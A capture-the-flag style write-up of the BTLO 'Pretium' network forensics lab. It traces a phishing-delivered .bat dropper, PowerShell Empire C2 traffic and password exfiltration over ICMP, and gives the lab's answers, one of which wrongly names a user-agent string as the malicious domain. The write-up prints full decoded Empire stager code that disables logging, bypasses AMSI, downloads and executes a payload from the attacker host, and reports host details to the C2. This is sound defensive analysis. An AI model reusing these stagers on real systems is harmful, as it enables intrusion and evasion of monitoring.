---
title: Pretium
url: /writeups/btlo/pretium
categories: ["Writeups"]
tags: ["BTLO", "Digital Forensics"]
date: 2021-04-02
summary: "A Managed Detection and Response (MDR) SOC pulled a suspicious email from a client that included a malicious link to download an executable file. A PCAP was retrieved that included traffic from the victim workstation."
featuredImage: images/btlo/official/n1wgrZgVHV9NJOZ1rX8J.png
featuredImagePreview: false
lightgallery: true
---

## Walkthrough

In this scenario, a user interacted with a link from an email which downloaded a malicious invoice file. A network capture was performed at the time of the incident and we are asked to analyse the pcap capture.

### HTTP traffic

Since the file was accessed via a hyperlink, let's check if we can retrieve it from the packet capture from HTTP traffic:

{{< image src="images/btlo/pretium/5baab86cd37042ac901dbce1a235c6dd.png" caption="HTTP objects" >}}

As we already know that the user was asked to download an invoice, we can easily identify it:

{{< image src="images/btlo/pretium/270e94224d7e40788983090d60bde3da.png" caption="Interesting file" >}}

Here we get the name of the initial payload.

{{< admonition type=question title="What is the full filename of the initial payload file?" open=false >}}
**INVOICE_2021937.pdf.bat**
{{< /admonition >}}

If we follow the HTTP stream for the packet when the file is downloaded:

{{< image src="images/btlo/pretium/18bb311e45a74e7bacc9cc1c24b45d1d.png" caption="Follow HTTP stream" >}}

In the headers, we have some information regarding the server:

{{< image src="images/btlo/pretium/48cca5557d7b4a528274065440695174.png" caption="Server header" >}}

We can see the python module used.

{{< admonition type=question title="What is the name of the module used to serve the malicious payload?" open=false >}}
**SimpleHTTPServer**
{{< /admonition >}}

This module is very useful to easily serve files through HTTP with a simple command: 
```bash
python3 -m http.server
```

From the same packet, we also get the IP of the attacker machine.

{{< admonition type=question title="What is the name of the module used to serve the malicious payload?" open=false >}}
**192.168.1.9**
{{< /admonition >}}

Based on the previous questions, we now have the URL that was in the email.

{{< admonition type=question title="Now that you know the payload name and the module used to deliver the malicious files, what is the URL that was embedded in the malicious email?" open=false >}}
**http://192.168.1.9:443/INVOICE_2021937.pdf.bat**
{{< /admonition >}}

When extracting the file from **Wireshark**, I got an antivirus alert and the file was deleted immediately. Without admin privileges I couldn't authorize the file.
However, by downloading it as a `.txt` the antivirus didn't trigger.
We can then see the malicious payload.

You can also extract the payload directly from the packet itself:

{{< image src="images/btlo/pretium/f1cd9f4d5109483ca8cde60b93b82cec.png" caption="Extract payload" >}}

Extracted payload:

```powershell
@echo off
start /b powershell -noP -sta -w 1 -enc  <Base64 encoded value>
start /b "" cmd /c del "%%~f0"&exit /b
```

We have the PowerShell launcher string.

{{< admonition type=question title="Find the PowerShell launcher string (you don’t need to include the base64 encoded script):" open=false >}}
**powershell -noP -sta -w 1 -enc**
{{< /admonition >}}

To decode the base64, I used [CyberChef](https://gchq.github.io/CyberChef/).

Raw Base64 decoded payload with indentation:

```powershell
If($PSVERSIoNTable.PSVErsIoN.MajoR -Ge 3)
{
    $7b0e3=[rEF].ASSEmBLy.GeTType('System.Management.Automation.Utils')."GetFie`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
    IF($7B0e3)
    {
        $b3480=$7b0e3.GETValuE($nuLL);
        IF($B3480['ScriptB'+'lockLogging'])
        {
            $b3480['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
            $B3480['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
        }
        $VAl=[COLLeCtions.GenerIC.DiCtioNAry[sTring,SYSTEm.OBjecT]]::nEW();
        $VAL.ADd('EnableScriptB'+'lockLogging',0);
        $VaL.ADD('EnableScriptBlockInvocationLogging',0);
        $B3480['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
    }
    ELse
    {
        [SCrIPTBLoCK]."GEtFie`Ld"('signatures','N'+'onPublic,Static').SetVALuE($NuLl,(NeW-OBjECT COLLectIONS.GEneriC.HASHSET[stRiNg]))
    }
    $REF=[REf].AssEMbly.GetTYPE('System.Management.Automation.Amsi'+'Utils');
    $REf.GEtFIeLd('amsiInitF'+'ailed','NonPublic,Static').SETVAlUe($NUll,$tRUE);
};

[SysTEM.NEt.SeRviCEPoInTMANAGer]::EXPEct100ConTINue=0;
$89818=NEW-ObJECt SYsTEm.NEt.WeBCLiEnT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([TExT.EncODiNg]::UnIcode.GeTSTRiNG([CONveRt]::FRomBase64STRiNG('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADkAOgA4ADAA')));
$t='/news.php';
$89818.HeAdERS.AD('User-Agent',$u);
$89818.PrOxY=[SySteM.NEt.WeBREquEsT]::DEFAULtWebPrOxY;
$89818.PrOXY.CREDENTIALs = [SYstEM.Net.CreDeNtIAlCacHE]::DEfaulTNetwOrKCRedENtIals;$Script:Proxy = $89818.Proxy;
$K=[SysTem.TeXT.ENCoDINg]::ASCII.GetBytes('w,PNLOZycKI<usBdSQ~jp;5?!MJ9#1]A');

$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};

$89818.HEaDerS.Add("Cookie","wYmshpvXDmn=xh3bLxkNMIyDrcCdNO+vW6hh+ss=");
$DATa=$89818.DowNLoADData($ser+$t);
$Iv=$daTa[0..3];
$DATA=$datA[4..$DAta.leNGTH];
-JOin[CHAR[]](& $R $DaTA ($IV+$K))|IEX
```

From the base64 decoded payload, we notice the user agent:
```
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
```

{{< admonition type=question title="What is the malicious domain used by the threat actor?" open=false >}}
**Mozilla/5.0**
{{< /admonition >}}

We can also see it in following requests after the file was downloaded:

{{< image src="images/btlo/pretium/7b094e6f0b6d4d8bb9a1c9f35b5e2540.png" caption="User agent" >}}

After the initial payload, multiple HTTP requests are made from the victim to the C2 server asking for further instructions, acting like a beacon.

{{< admonition type=question title="You are seeing a lot of HTTP traffic, what is the name of a process where malware communicates with C2 server asking for instructions at set time intervals? " open=false >}}
**beaconing**
{{< /admonition >}}

To find the URI containing `login` we can perform a search in **Wireshark**:

{{< image src="images/btlo/pretium/f850179dd8514508a6f60ee47d324ace.png" caption="Search in packet" >}}

{{< image src="images/btlo/pretium/6de55db07c0a4c1099dab68a3ecdfb60.png" caption="String search" >}}

{{< admonition type=question title="What is the URI containing ‘login’ that the victim machine is communicating to?" open=false >}}
**/login/process.php**
{{< /admonition >}}

The initial powershell command and the endpoint `news.php`, `/login/process.php` and `/admin/get.php` are signatures for the [Powershell Empire framework](https://www.powershellempire.com/).

{{< admonition type=question title="Can you name the post-exploitation framework used for C2 communication now to our victim machine?" open=false >}}
**Empire**
{{< /admonition >}}

### ICMP traffic

After reading the provided materials and reviewing carefully all packets, in the **ICMP** we can notice something weird:

{{< image src="images/btlo/pretium/c216093287e04a5a895462928b4f7b93.png" caption="Weird ICMP packet" >}}

There is 1 byte of data sent to each **ICMP** request. For example in the screenshot above, the letter ***U*** is sent.

Lets use a filter to only show the ICMP requests:

{{< image src="images/btlo/pretium/8939caed06694fa684f639decb7d895f.png" caption="ICMP filter" >}}

When following the requests, at some point the character ***"="*** appears:

{{< image src="images/btlo/pretium/e2fc10309f384a6aa4c560a22c8f6477.png" caption="Base64 indicator" >}}

It seems that a base64 string is exfiltrated.

It would have been possible to automate the extraction with a python script using the **Scapy** module. 
You can check this [article](https://sec.alexflor.es/post/icmp_pcaps/) if you want to learn more about this subject.

As neither python and scapy were available in the lab environment, we can use **Tshark** instead.

We can use a display filter to show only ICMP requests and extract the **Data** field of each packet.
Once extracted, each data can be converted from ***hex*** to ***char*** and concatenated.

We can use the following powershell code to do what we need:

```powershell
$result = & 'C:\Program Files\Wireshark\tshark.exe' -r LAB.pcap -Y "icmp.type == 8" -T fields -e data

for($a = 0; $a -lt $result.count; $a++)
{
    $value = $result[$a].trim();
    $result_clean += [char][byte]"0x$value"
}
$result_clean
```

After reconstructing the string, we get:

```
UABhAHMAcwB3AG8AcgBkACAAZgBvAHIAIABtAHkAIAAkAHMAZQBjAC0AYQBjAGMAbwB1AG4AdAA6ACAAWQAwAHUAdABoAGkAbgBrAHkAMAB1AGMAQQBuAGMANAB0AGMAaABtADMAJAAkAA=
```

Once decoded:
```
Password for my $sec-account: Y0uthinky0ucAnc4tchm3$$
```
{{< admonition type=question title="Using some Blue Team Magic, can detect data exfiltration and find out what have been exfiltrated? Provide the decoded password:" open=false >}}
**Y0uthinky0ucAnc4tchm3$$**
{{< /admonition >}}

{{< admonition type=question title="What is the account’s username? (Include $ at the beginning):" open=false >}}
**$sec-account**
{{< /admonition >}}

## Going further

For the last two questions, I first thought that we needed to decrypt the empire traffic to find the data exfiltrated.

Here is what I did before realizing that **ICMP** packets were used for exfiltration.

### Empire staging process

First, lets review the [staging process from Empire](https://www.powershellempire.com/?page_id=147):

{{< image src="images/btlo/pretium/3c54575868654a409574e929fe59a3a7.png" caption="Empire's staging process" >}}

The related packets are:

{{< image src="images/btlo/pretium/a52161b4626b4b9aaf0fcc20543adbe5.png" caption="Staging requests" >}}

In our case the **Control Server** is **192.168.1.9** and the **Client** is **192.168.1.8**.

Let's focus on the powershell payload recovered before as this is where we could understand how the traffic will be encrypted in the next requests and we will also find the staging key that could be use to decrypt this traffic.

Let's take the first part of the script:

```powershell
If($PSVERSIoNTable.PSVErsIoN.MajoR -Ge 3)
{
    $7b0e3=[rEF].ASSEmBLy.GeTType('System.Management.Automation.Utils')."GetFie`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');
    IF($7B0e3)
    {
        $b3480=$7b0e3.GETValuE($nuLL);
        IF($B3480['ScriptB'+'lockLogging'])
        {
            $b3480['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
            $B3480['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
        }
        $VAl=[COLLeCtions.GenerIC.DiCtioNAry[sTring,SYSTEm.OBjecT]]::nEW();
        $VAL.ADd('EnableScriptB'+'lockLogging',0);
        $VaL.ADD('EnableScriptBlockInvocationLogging',0);
        $B3480['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
    }
    ELse
    {
        [SCrIPTBLoCK]."GEtFie`Ld"('signatures','N'+'onPublic,Static').SetVALuE($NuLl,(NeW-OBjECT COLLectIONS.GEneriC.HASHSET[stRiNg]))
    }
    $REF=[REf].AssEMbly.GetTYPE('System.Management.Automation.Amsi'+'Utils');
    $REf.GEtFIeLd('amsiInitF'+'ailed','NonPublic,Static').SETVAlUe($NUll,$tRUE);
};
```

This part is not very interesting for us, what it basically does is based on the powershell version, it will disable the [**Script Block Logging**](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html "Script block logging records blocks of code as they are executed by the PowerShell engine, thereby capturing the full contents of code executed by an attacker, including scripts and commands. Due to the nature of script block logging, it also records de-obfuscated code as it is executed. While not available in PowerShell 4.0, PowerShell 5.0 will automatically log code blocks if the block’s contents match on a list of suspicious commands or scripting techniques, even if script block logging is not enabled.").

This is a powershell feature that logs executed commands and scripts.

The second part of the script will give us more information on how the client will reply to the C2 server. I'll comment directly into the code:

```powershell
[SysTEM.NEt.SeRviCEPoInTMANAGer]::EXPEct100ConTINue=0;
$89818=NEW-ObJECt SYsTEm.NEt.WeBCLiEnT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';

## Base64 encoded value for http://192.168.1.9:80
$ser=$([TExT.EncODiNg]::UnIcode.GeTSTRiNG([CONveRt]::FRomBase64STRiNG('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADkAOgA4ADAA')));

$t='/news.php';
$89818.HeAdERS.ADD('User-Agent',$u);
$89818.PrOxY=[SySteM.NEt.WeBREquEsT]::DEFAULtWebPrOxY;
$89818.PrOXY.CREDENTIALs = [SYstEM.Net.CreDeNtIAlCacHE]::DEfaulTNetwOrKCRedENtIals;$Script:Proxy = $89818.Proxy;

## Staging Key. One of the two parts needed for the decryption key
$K=[SysTem.TeXT.ENCoDINg]::ASCII.GetBytes('w,PNLOZycKI<usBdSQ~jp;5?!MJ9#1]A');

## RC4 algorithm
## The algorithm is the same for encryption and decryption
$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};
$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};

$89818.HEaDerS.Add("Cookie","wYmshpvXDmn=xh3bLxkNMIyDrcCdNO+vW6hh+ss=");

## Perform the request: GET http://192.168.1.9:80/news.php and save the data from the response as bytes in a variable
$DATa=$89818.DowNLoADData($ser+$t);

## IV is the 4 bytes of the response. One of the two parts needed for the decryption key
$Iv=$daTa[0..3];

## Since the 4 bytes are meant for the IV, remove the first 4 bytes to get the proper response data
$DATA=$datA[4..$DAta.leNGTH];

## Call the RC4 algorithm to decrypt the response data. The decryption key used is $IV + $K. 
## Once the data is decrypted, it is converted as a string and the command is executed with Invoke-Expression
-JOin[CHAR[]](& $R $DaTA ($IV+$K))|IEX
```

If you want to learn more about this specific implementation of the RC4 algorithm, check this [great article](https://www.harmj0y.net/blog/powershell/powershell-rc4/) !

When filtering on HTTP on wireshark, after the victim downloads the malicious invoice, we have indeed a GET request made to the **/news.php** endpoint.

If we want to decrypt the reply, we need to extract the data from the response, extract the 4 bytes for our IV, remove them from the data and apply the RC4 algorithm on the response data using the combination of the IV and the staging key.

### Decryption algorithm

I wrote the following code for the decryption. Again I'll comment directly into it:

```powershell
## Staging key
$K=[SysTem.TeXT.ENCoDINg]::ASCII.GetBytes('w,PNLOZycKI<usBdSQ~jp;5?!MJ9#1]A');

## RC4 algorithm
$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};

## Convert the data form hex to bytes (since the data from Wireshark will be in hex)
$data = [byte[]] -split ('<RESPONSE_DATA_IN_HEX>' -replace '..', '0x$& ');

## Extract the IV
$Iv=$daTa[0..3];

## Remove the 4 bytes used for the IV from the data
$DATA=$datA[4..$DAta.leNGTH];

## Call the RC4 algorithm to decrypt the data using $IV+$K as decryption key
## The result is then converted as a string
-JOin[CHAR[]](& $R $DaTA ($IV+$K))
```

### Extract data with Tshark

OK, now we need to retrieve the data from the packet capture !
For that, I used **Tshark**.

We are interested in this specific packet:

{{< image src="images/btlo/pretium/7950318feb3b4258a692a43abd722d23.png" caption="Frame number" >}}

Knowing the frame number, we can specify it in **tshark** with the `-Y` option. However we don't know in which field the data is located. I use the `-T pdml` option to list all fields and identify the one I am interested in:

```PowerShell
PS C:\Users\BTLOTest\Desktop\Investigation> & "C:\Program Files\Wireshark\tshark.exe" -r .\LAB.pcap -Y "frame.number == 4845" -T pdml
```

{{< image src="images/btlo/pretium/e2b558ee12344086a1796844d8aa0673.png" caption="List all fields in tshark" >}}
{{< image src="images/btlo/pretium/46d71d5380104633bab9ee4d722e01e1.png" caption="Value field" >}}

And I then copy paste the value.
Since the data is very long I won't copy it here.

### Decrypt payload

We then run our powershell command and we manage to decrypt it !

{{< image src="images/btlo/pretium/c73b031651004d3f8eb8a908f5c4fea9.png" caption="Decrypted payload" >}}

**Note**: I have been stuck for days because of Powershell ISE... For an unknwown reason to me, when running the code from ISE as a script I get a different result than from the powershell command line... Anyway it conviced me to never use ISE again.

The second payload with indentation:
```powershell
FUNCtIoN StARt-NeGOTiAte
{
    PArAm($s,$SK,$UA='MOzIlla/5.0 (Windows NT 6.1; WOW64; TrIDenT/7.0; rV:11.0) likE GeCKO',$HoP)
    
    FunCtION COnvERTTo-RC4ByteSTrEaM 
    {
        PaRaM ($RCK, $IN)
        beGIN 
        {
            [Byte[]] $STr = 0..255;$J = 0;0..255 | FoREaCh-ObjEcT 
            {
                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.LeNGth]) % 256;
                $Str[$_], $STr[$J] = $Str[$J], $STr[$_];
            };
            $I = $J = 0;
        }
        PROcEss 
        {
            FOrEAch($BYTE iN $In) 
            {
                $I = ($I + 1) % 256;
                $J = ($J + $STr[$I]) % 256;$Str[$I], $STR[$J] = $Str[$J], $Str[$I];
                $BYTE -BXOR $Str[($STR[$I] + $STr[$J]) % 256];
            }
        }
    }
    
    FuncTIOn DecrYpt-BYtEs 
    {
        paRAm ($Key, $In)iF($IN.LengtH -Gt 32) 
        {
            $HMAC = NeW-OBJeCt SystEM.SecUritY.CryPtoGRaphy.HMACSHA256;
            $e=[SYSTEM.TEXT.ENcODInG]::ASCII;$Mac = $IN[-10..-1];
            $In = $In[0..($In.lenGtH - 11)];
            $hMAc.KEY = $E.GEtBYtEs($KEY);
            $EXPectED = $hmAc.CoMPUTeHASH($In)[0..9];
            If (@(COmparE-ObjeCT $MaC $Expected -SYNc 0).LEnGtH -NE 0) 
            {
                rETUrn;
            }
            $IV = $IN[0..15];
            tRy 
            {
                $AES=NEw-OBjECT SyStEm.SecURity.CRYPtogrAPHY.AESCRyPtoSErvIcEPROviDeR;
            }
            cATCh 
            {
                $AES=NEw-OBjEcT SYSTEM.SEcuRIty.CRypTOgRaPhy.RIjnDaelMaNaGeD;
            }
            $AES.Mode = "CBC";$AES.KeY = $E.GetBYtes($KEY);
            $AES.IV = $IV;
            ($AES.CREATEDECrYptOr()).TRansFORMFInAlBlOcK(($In[16..$In.LenGth]), 0, $IN.LEnGTH-16)
        }
    }

    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
    $ErrorActionPreference = "SilentlyContinue";
    $e=[SYSTEm.Text.EnCOdInG]::UTF8;
    $customHeaders = "";
    $SKB=$E.GETBYtES($SK);
    TrY 
    {
        $AES=NeW-OBJEct SYStem.SEcuRITY.CrYPtOGrAPhY.AESCryPtOSeRviCEPROVideR;
    }
    CAtcH 
    {
        $AES=NEW-ObJecT SySTEm.SeCurITy.CrYPToGrApHY.RIJNDaeLMANAGeD;
    }
    $IV = [ByTe] 0..255 | GEt-RanDOm -cOunT 16;
    $AES.Mode="CBC";
    $AES.Key=$SKB;
    $AES.IV = $IV;
    $HmaC = NEw-OBJECT SyStEm.SECUritY.CRYpTogrAPHY.HMACSHA256;
    $HmAc.Key = $SKB;
    $CsP = NEW-ObJECT SySTeM.SeCURITY.CrYptoGRapHy.CSPParameTerS;
    $CSP.FLAgs = $csP.FLaGs -BoR [SYsTem.SeCuRITy.CrYptOGraPhy.CSpPRoVIdERFLAGS]::USeMaChINeKEySTore;
    $RS = New-ObjeCT SYSteM.SeCuRITy.CRyPTOgRApHy.RSACryPtOSErvICePrOVIdER -ArGumEnTLIst 2048,$Csp;
    $rk=$Rs.ToXmLSTRiNG($FaLSe);
    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);
    $iB=$E.GEtBytes($rK);
    $eB=$IV+$AES.CReATeEncryPTor().TranSfOrMFINaLBlocK($ib,0,$IB.LEnGth);
    $Eb=$Eb+$hMAc.COmpUteHaSh($Eb)[0..9];
    IF(-noT $WC) 
    {
        $wc=NEW-OBjecT SySteM.Net.WeBClient;$Wc.PrOxY = [SyStem.NEt.WeBREQuest]::GETSYStemWEBPrOXy();
        $wC.ProXY.CREDEnTIALs = [System.Net.CRedentIALCACHe]::DEfaUltCRedentIAls;
    }
    iF ($ScRIpT:PrOxy) 
    {
        $WC.PROXy = $ScRiPT:ProXY;
    }
    if ($customHeaders -ne "") 
    {
        $HEaDErS = $cusToMHeaDERs -SPlit ',';
        $headERs | ForEACh-ObjeCt 
        {
            $hEADERKEy = $_.spLit(':')[0];
            $HEaderVALUE = $_.sPliT(':')[1];
            if ($headerKey -eq "host")
            {
                Try{$ig=$WC.DownLoAdDaTA($S)}cAtcH{}
            };
            $wC.HeaDErs.AdD($hEAdErKEY, $hEaDERVALue);
        }
    }
    $wc.Headers.Add("User-Agent",$UA);
    $IV=[BiTConvERTER]::GETByTEs($(Get-RAnDoM));
    $Data = $e.GETbyteS($ID) + @(0x01,0X02,0X00,0x00) + [BItCONvERTEr]::GeTByTEs($Eb.LeNGtH);
    $rC4P = CoNVertTO-RC4BYTEStreAm -RCK $($IV+$SKB) -In $DAtA;
    $rC4P = $IV + $Rc4P + $EB;
    $raw=$wc.UploadData($s+"/news.php","POST",$rc4p);
    $DE=$E.GetSTrinG($Rs.DEcrypt($rAW,$FaLSE));
    $NoNcE=$DE[0..15] -Join '';
    $keY=$dE[16..$De.LengTh] -joiN '';
    $NONCe=[StrinG]([lOng]$nONce + 1);
    tRY 
    {
        $AES=NEw-OBJeCT SYSTeM.SeCUriTy.CRYPtOgrapHy.AEsCRyptoSeRvICePRoVIdEr;
    }
    CATch 
    {
        $AES=New-OBJeCt SYStem.SecUrIty.CryPTOgRApHY.RIJndAELMaNAgEd;
    }
    $IV = [ByTE] 0..255 | GeT-RAnDom -CouNT 16;
    $AES.Mode="CBC";
    $AES.Key=$e.GeTBYtES($Key);
    $AES.IV = $IV;
    $i=$nOnCe+'|'+$s+'|'+[EnVIrONmEnT]::UsErDomainNaME+'|'+[ENViRONMEnt]::UsERNaME+'|'+[ENVIRONMEnT]::MacHineName;
    TRy
    {
        $P=(gWmi WiN32_NETwOrKADaPtERCOnfIguraTION|WHERE{$_.IPADdRess}|SEleCT -ExpaNd IPAdDResS);
    }
    CaTch 
    {
        $p = "[FAILED]"
    }
    $Ip = @{$truE=$P[0];
    $FALse=$P}[$p.LengtH -lT 6];
    if(!$ip -Or $Ip.triM() -Eq '')
    {
        $IP='0.0.0.0'
    };
    $i+="|$ip";
    tRy
    {
        $I+='|'+(Get-WMIOBJect Win32_OperAtiNGSYSTEM).NaMe.sPLIT('|')[0];
    }
    CAtcH
    {
        $i+='|'+'[FAILED]'
    }
    if(([Environment]::UserName).ToLower() -eq "system")
    {
        $i+="|True"
    }
    else 
    {
        $i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    }
    $n=[SysTEm.DiAGnOstICS.ProcEss]::GeTCURrENtPrOcess();
    $i+='|'+$N.ProceSSNaMe+'|'+$N.ID;$i += "|powershell|" + $PSVersionTable.PSVersion.Major;
    $ib2=$E.GetByTES($i);
    $Eb2=$IV+$AES.CReATEENCRypToR().TRansFoRmFInALBLocK($IB2,0,$Ib2.LENGTh);
    $hMac.Key = $e.GetBYtES($kEy);
    $eb2 = $Eb2+$hMaC.CoMPutEHASH($eB2)[0..9];
    $IV2=[BitCONvErtER]::GEtByteS($(GEt-RAnDOm));
    $DATA2 = $e.gEtBytES($ID) + @(0x01,0X03,0X00,0x00) + [BiTCOnvERTER]::GETByTes($eb2.LengTH);
    $Rc4P2 = ConvErtTO-RC4BYtESTREaM -RCK $($IV2+$SKB) -In $daTA2;
    $rc4P2 = $IV2 + $rC4P2 + $eb2;
    if ($customHeaders -ne "")
    {
        $headERs = $cUstOMHeAdERS -SPLIt ',';
        $HEADErS | FOREACH-ObJEcT 
        {
            $heaDErKeY = $_.SpLIt(':')[0];
            $hEAderVaLuE = $_.sPlIT(':')[1];
            if ($headerKey -eq "host")
            {
                trY
                {
                    $iG=$WC.DOwnLoADDATA($S)
                }
                cAtcH{}
            };
            $wC.HEadERS.Add($HEaderKEy, $heADERValuE);
        }
    }
    $wc.Headers.Add("User-Agent",$UA);
    $wc.Headers.Add("Hop-Name",$hop);
    $raw=$wc.UploadData($s+"/news.php","POST",$rc4p2);
    IEX $( $E.GetStRinG($(DecRYpt-BYTEs -KEY $KeY -In $RAw)) );
    $AES=$nuLl;
    $s2=$NULl;
    $wC=$Null;$Eb2=$NuLl;
    $raW=$nUlL;
    $IV=$nULL;
    $wc=$NuLL;
    $i=$nulL;
    $Ib2=$nUll;
    [GC]::COLlEcT();
    ND7K5 -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
}
Start-Negotiate -s "$ser" -SK 'w,PNLOZycKI<usBdSQ~jp;5?!MJ9#1]A' -UA $u -hop "$hop";
```
## Final notes

At this point I understood that I only managed to decrypt the first request and that the following one will be encrypted in a different way, notably using AES.

If it was the intended way it wouldn't be worth only 5 points ! That's when I decided to review other packets and noticed the weird ICMP packets.

This investigation is one of my favorite so far. Even though I got stuck for a long time on the last two questions, I really enjoyed the learning experience !

## Resources

- <https://stackoverflow.com/questions/38546887/decrypting-powershell-empire>

- <https://plaintext.do/AV-Evasion-Converting-PowerEmpire-Stage-1-to-CSharp-EN>

- <https://www.harmj0y.net/blog/powershell/powershell-rc4>

- <https://www.powershellempire.com/?page_id=147>

- <https://github.com/EmpireProject/Empire/blob/master/data/agent/stagers/http.ps1>

- <https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html>

- <https://sec.alexflor.es/post/icmp_pcaps>
